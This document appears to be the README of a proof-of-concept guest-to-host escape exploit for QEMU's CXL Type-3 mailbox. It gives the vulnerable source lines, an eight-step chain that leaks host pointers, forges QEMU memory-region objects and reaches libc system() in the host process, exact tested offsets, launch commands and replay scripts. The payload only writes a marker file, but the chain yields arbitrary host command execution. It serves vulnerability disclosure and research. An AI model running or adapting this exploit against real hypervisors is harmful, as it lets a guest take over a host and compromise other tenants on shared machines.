# QEMU CXL Type-3 mailbox escape PoC

This folder contains a stock QEMU replay for a CXL Type-3 mailbox memory corruption chain. The guest boots from a small BIOS floppy image, configures the CXL PCI path, drives the BAR2 mailbox registers, leaks host pointers from the CXL command information structure, forges QEMU memory API objects with a mailbox write, and executes a host marker command through the QEMU process.

The marker command is:

```sh
id>/tmp/qemu_cxl_escape_marker
```

## Files

| File | Purpose |
| --- | --- |
| `poc.img` | Prebuilt BIOS floppy image for the tested upstream build. |
| `boot.asm` | 16-bit loader that reads the protected-mode stage from the floppy image. |
| `stage2.c` | Freestanding 32-bit guest stage that drives PCI config space and the CXL mailbox. |
| `stage2.ld` | Linker script for the flat protected-mode stage. |
| `build.sh` | Rebuilds `poc.img` from source. |
| `run.sh` | Launches QEMU with CXL Type-3 enabled and checks the host marker. |

## Tested Target

The replay was verified against upstream QEMU commit:

```text
30e8a06b64aa58a3990ba39cb5d09531e7d265e0
```

The tested binary reports:

```text
QEMU emulator version 11.0.50
```

The tested binary hash was:

```text
68129e7f33b5b75d15610d80cf5d08903ad33613af5ac0228b7a4abfb277ffae  qemu-system-x86_64
```

The prebuilt image hash is:

```text
00318bb9c4574469a56ac58e91d8f603e60958e4e492222267f1d187b1281b21  poc.img
```

## Requirements

Build requirements for the included source:

```text
nasm
gcc with 32-bit freestanding code generation
ld
python3
```

Replay requirements:

```text
qemu-system-x86_64 built with CXL Type-3 support
Linux host shell with timeout
```

## Quick Run

From this directory:

```sh
sh run.sh /absolute/path/to/qemu-system-x86_64
```

Successful replay prints the guest serial trace and the host marker:

```text
stage2 start
pci done
handler=0x00005d41f6d636f0
qemu_base=0x00005d41f68b6000
ct3d=0x000077f609b3a010
rank=0x000077f60a1ffb7a
fake leak call
media-op sent
bg done
libc_start=0x000077f60c82a200
system=0x000077f60c858750
fake system call
media-op sent
bg done
stage2 done
uid=1000(owner) gid=1000(owner) groups=1000(owner),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users)
```

The helper writes logs under:

```text
run/serial.log
run/qemu.stdout.log
run/qemu.stderr.log
```

The QEMU process is terminated by `timeout` after the guest has halted.

## Rebuild

From this directory:

```sh
sh build.sh
```

Expected build output includes:

```text
boot=512 stage=4560 image=1474560
```

## QEMU Launch Shape

The replay uses a CXL-enabled q35 machine with one CXL Type-3 endpoint, volatile memory, and one dynamic-capacity region:

```sh
qemu-system-x86_64 \
  -display none \
  -nodefaults \
  -machine q35,cxl=on,cxl-fmw.0.targets.0=cxl.0,cxl-fmw.0.size=4G \
  -device pxb-cxl,id=cxl.0,bus=pcie.0,bus_nr=52 \
  -device cxl-rp,id=rp0,bus=cxl.0,chassis=0,slot=0 \
  -object memory-backend-ram,id=cxl-mem0,size=256M \
  -object memory-backend-ram,id=cxl-dc0,size=256M \
  -device cxl-type3,bus=rp0,volatile-memdev=cxl-mem0,volatile-dc-memdev=cxl-dc0,num-dc-regions=1,id=mem0 \
  -drive file=poc.img,format=raw,if=floppy \
  -boot a \
  -serial file:run/serial.log \
  -no-reboot
```

## Source Trace

The CXL GET_LOG handler checks `offset + length` as a byte range against `sizeof(cci->cel_log)`, then uses `offset` as an array index:

```text
hw/cxl/cxl-mailbox-utils.c:1217
if ((uint64_t)get_log->offset + get_log->length >= sizeof(cci->cel_log)) {

hw/cxl/cxl-mailbox-utils.c:1220
memmove(payload_out, cci->cel_log + get_log->offset, get_log->length);
```

The CXL SET_FEATURE rank-sparing handler copies guest data to `rank_sparing_wr_attrs + hdr->offset` without checking the destination object bounds:

```text
hw/cxl/cxl-mailbox-utils.c:1908
memcpy((uint8_t *)&ct3d->rank_sparing_wr_attrs + hdr->offset,
       mem_sparing_write_attrs, bytes_to_copy);
```

The cleanup path then clears `set_feat_info->data_size` bytes from the selected feature write-attribute object:

```text
hw/cxl/cxl-mailbox-utils.c:1941
memset(&ct3d->rank_sparing_wr_attrs, 0, set_feat_info->data_size);
```

## Exploit Flow

1. The guest bootloader switches to protected mode and jumps to the stage at `0x8000`.
2. The stage configures the CXL root port and Type-3 endpoint through PCI config I/O ports.
3. GET_LOG leaks a QEMU text pointer and the host `CXLType3Dev` pointer.
4. The stage derives the QEMU PIE base from `cmd_logs_get_log`.
5. The stage derives libc through a fake callback to `memmove@plt`.
6. SET_FEATURE rank-sparing writes a forged dynamic-capacity state, `FlatView`, `AddressSpaceDispatch`, `MemoryRegionSection`, `MemoryRegion`, and `MemoryRegionOps` into the CXL Type-3 object tail.
7. MEDIA_OPERATIONS sanitize calls `address_space_set()` on the forged dynamic-capacity address space.
8. The forged `MemoryRegionOps.write` callback first leaks libc, then calls libc `system()` with the marker command.

## Tested Offsets

| Item | Offset |
| --- | ---: |
| `cmd_logs_get_log` | `0x4ad6f0` |
| `memmove@plt` | `0x3381b0` |
| `__libc_start_main@GLOB_DAT` | `0x1ad6fe8` |
| `__libc_start_main` in libc | `0x2a200` |
| `system` in libc | `0x58750` |
| `rank_sparing_wr_attrs` from `CXLType3Dev` | `0x6c5b6a` |
| GET_LOG OOB scratch from `CXLType3Dev` | `0x245820` |
| GET_LOG handler leak relative offset | `0x80c8` |
| GET_LOG `CXLType3Dev` leak relative offset | `0x88` |

## Evidence Meaning

The marker file proves the callback reached libc `system()` inside the QEMU host process:

```text
/tmp/qemu_cxl_escape_marker
```

The serial log shows both callback stages completing:

```text
fake leak call
media-op sent
bg done
libc_start=...
system=...
fake system call
media-op sent
bg done
stage2 done
```

